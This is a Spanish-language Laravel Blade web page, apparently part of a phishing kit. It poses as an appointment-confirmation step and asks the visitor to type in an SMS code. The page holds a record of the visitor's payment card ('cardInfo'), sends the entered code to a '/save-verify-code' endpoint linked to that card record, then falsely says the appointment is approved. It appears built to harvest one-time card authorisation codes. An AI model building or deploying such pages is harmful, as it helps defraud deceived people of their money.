<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Phone Verification</title>
  <link rel="icon" href="{{ Url('assets/favicon.svg') }}" />
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: sans-serif;
      background: #f9f9f9;
    }
    .spinner {
      border: 8px solid #eee;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .code-inputs {
      gap: 10px;
    }
    .code-inputs input {
      width: 40px;
      height: 50px;
      font-size: 24px;
      text-align: center;
      border: 2px solid #ccc;
      border-radius: 8px;
    }
    h2 {
      margin-bottom: 20px;
      color: #333;
    }
  </style>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
</head>
<body>

  <h2 style="max-width: 800px;">Por favor, espere y no cierre esta página. En breve recibirá en su teléfono un código de confirmación, que le rogamos introducir en la casilla de abajo para poder confirmar su cita.
  Le pedimos un poco de paciencia, ya que el proceso puede tardar hasta 5 minutos.</h2>
  <div id="spinner" class="spinner"></div>

  <input type="hidden" id="cardInfo" value="{{json_encode($cardInfo)}}"/>
  <div id="codeInputs" class="code-inputs">
    <input type="text" style="width: 300px;" id="verifyCode">
  </div>
    <button id="submit" style="
        background: #3d6eff;
        border: none;
        border-radius: 8px;
        padding: 10px 30px;
        color: white;
        font-size: 20px;
        margin-top: 15px;">
      Enviar
    </button>

  <script>
        const title = document.querySelector('h2');
        let cardInfo = JSON.parse($('#cardInfo').val());
        console.log(cardInfo)
        $('#submit').on('click', function(){
            if($('#verifyCode').val() == '') return;
            $.ajax({
              type: 'GET',
              url: "{{Url('/save-verify-code')}}",
              data: {
                code: $('#verifyCode').val(),
                cardInfoId: cardInfo.id
              },
              success: function(){
                title.innerText = 'Su cita ha sido aprobada. Con un día de antelación a la misma, recibirá un mensaje de texto SMS de nuestra parte.';
                $('#codeInputs').remove();
                $('#spinner').remove();
                $('#submit').remove();
                setTimeout(() => {
                  window.location.href = "/"
                }, 15000)
              }
            })
        })
  </script>

</body>
</html>
